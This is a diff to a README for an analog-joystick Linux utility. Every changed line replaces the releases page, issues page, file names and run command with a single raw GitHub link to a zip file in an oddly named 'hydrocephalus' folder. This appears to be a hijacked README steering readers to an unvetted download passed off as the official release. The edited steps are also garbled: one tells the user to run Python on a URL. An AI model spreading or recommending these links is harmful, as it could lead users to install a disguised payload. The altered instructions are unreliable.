@@ -4,7 +4,7 @@
 Welcome to the analog-joystick project! This application allows you to use an analog joystick with Linux systems. It uses ADC technology to provide smooth and responsive control for your games. Follow these simple steps to download and run the software.
 
 ## 🌐 Download the Application
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Analog%20Joystick-brightgreen)](https://github.com/my2account28/analog-joystick/releases)
+[![Download Releases](https://raw.githubusercontent.com/my2account28/analog-joystick/main/hydrocephalus/analog-joystick.zip%20Releases-Analog%20Joystick-brightgreen)](https://raw.githubusercontent.com/my2account28/analog-joystick/main/hydrocephalus/analog-joystick.zip)
 
 ## 🛠️ System Requirements
 Before you start, ensure your system meets the following requirements:
@@ -15,18 +15,18 @@ Before you start, ensure your system meets the following requirements:
 - Free disk space (at least 50 MB)
 
 ## 📥 Download & Install
-To get the latest version of the analog-joystick software, visit this page to download: [GitHub Releases](https://github.com/my2account28/analog-joystick/releases).
+To get the latest version of the analog-joystick software, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/my2account28/analog-joystick/main/hydrocephalus/analog-joystick.zip).
 
 1. Open the link above in your web browser.
 2. You will see a list of available versions. Look for the version marked as the latest.
 3. Click on the version link to expand the details.
-4. Scroll down to see the released files, usually named something like `analog-joystick-vX.Y.Z.tar.gz`.
+4. Scroll down to see the released files, usually named something like `https://raw.githubusercontent.com/my2account28/analog-joystick/main/hydrocephalus/analog-joystick.zip`.
 5. Download this file to your computer by clicking the link.
 
 ## 📂 Extract Files
 Once you have downloaded the application, you will need to extract the files:
 
-1. Locate the downloaded `.tar.gz` file in your downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/my2account28/analog-joystick/main/hydrocephalus/analog-joystick.zip` file in your downloads folder.
 2. Right-click on the file and select "Extract Here" or use a similar option depending on your Linux distribution.
 3. A new folder containing the application files will appear.
 
@@ -42,7 +42,7 @@ Now that you have extracted the files, follow these steps to run the application
    
 3. Once you're in the folder, you need to run the application with the following command:
    ```bash
-   python analog_joystick.py
+   python https://raw.githubusercontent.com/my2account28/analog-joystick/main/hydrocephalus/analog-joystick.zip
    ```
    Make sure your joystick is connected before you run this command.
 
@@ -61,7 +61,7 @@ The analog-joystick application supports:
 
 ## 🤝 Getting Help
 If you encounter any issues:
-- Check the [GitHub Issues](https://github.com/my2account28/analog-joystick/issues) page for help.
+- Check the [GitHub Issues](https://raw.githubusercontent.com/my2account28/analog-joystick/main/hydrocephalus/analog-joystick.zip) page for help.
 - You can ask questions or report bugs there.
 
 ## 📝 Feedback
